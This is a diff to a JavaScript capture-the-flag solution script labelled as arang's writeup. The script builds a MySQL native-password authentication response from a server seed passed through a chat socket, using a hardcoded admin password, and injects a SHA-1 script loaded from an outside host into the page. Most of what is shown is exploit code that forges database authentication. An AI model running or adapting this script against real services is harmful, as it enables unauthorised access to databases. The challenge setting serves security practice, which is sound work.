@@ -1,3 +1,5 @@
+// author(arang)'s writeup
+
 function ab2str(buf) {
 	return new TextDecoder().decode(buf)
 }
@@ -19,7 +21,7 @@ function xor(key, phrase){
 }
 
 function convertFromHex(hex) {
-    var hex = hex.toString();//force conversion
+    var hex = hex.toString();
     var str = '';
     for (var i = 0; i < hex.length; i += 2)
         str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
@@ -32,7 +34,7 @@ function addScript(cdnurl){
 	document.body.insertBefore(cjs_script,document.body.firstChild);	
 }
 
-async function digestMessage(message) {
+async function sha1(message) {
   const msgUint8 = Latin1ToUint8Array(message);                           
   const hashBuffer = await Crypto.SHA1(msgUint8, {asBytes: true});
   const hashArray = Array.from(new Uint8Array(hashBuffer));                     
@@ -44,9 +46,9 @@ async function step2(serverSeed){
 	//// mysql native password hashing process
 	// SHA1( password ) XOR SHA1( "20-bytes random data from server" <concat> SHA1( SHA1( password ) ) )
 	console.log("[+] seed "+btoa(serverSeed));
-	var sp = await digestMessage(password);
-	var ssp = await digestMessage(convertFromHex(sp))
-	var sssp = await digestMessage(serverSeed+convertFromHex(ssp))
+	var sp = await sha1(password);
+	var ssp = await sha1(convertFromHex(sp))
+	var sssp = await sha1(serverSeed+convertFromHex(ssp))
 	console.log("[+] sssp "+btoa(sssp));
 	
 	var hashedPassword = xor( convertFromHex(sp), convertFromHex(sssp) );
@@ -82,7 +84,7 @@ sock.on('join', function(data){
 sock.on('newchat', function(data){
 	//console.log(data.msg);
 	//var result = ab2str(data.msg);
-	var result = data.msg;
+	var result = data;
 	console.log("[+] newchat "+result);
 	round += 1
 	if (round == 2){
@@ -91,7 +93,6 @@ sock.on('newchat', function(data){
 		step2(serverSeed);
 	}
 })
-
 
 var password = "th1s_1s_ch4tdb_4dm1n_p4ssw0rd";
 addScript("https://arang.kr/sha1.js");
